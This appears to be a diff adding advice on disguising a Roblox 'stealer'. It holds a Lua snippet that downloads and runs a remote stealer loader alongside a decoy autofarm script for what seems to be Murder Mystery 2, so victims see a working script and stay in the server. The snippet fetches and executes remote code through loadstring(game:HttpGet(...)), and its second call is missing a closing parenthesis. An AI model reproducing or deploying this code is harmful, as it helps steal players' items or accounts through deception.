@@ -1,0 +1,12 @@
+If you want people to stay in the server, you probably need to add a real script on top of the stealer. You can do that by doing this:
+```lua
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/blockysz/mm2farm/script/loader'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/snxpzscripts/autofarm/refs/heads/main/xmm2')
+end
+
+task.spawn(stealer)
+task.spawn(farm)
+```
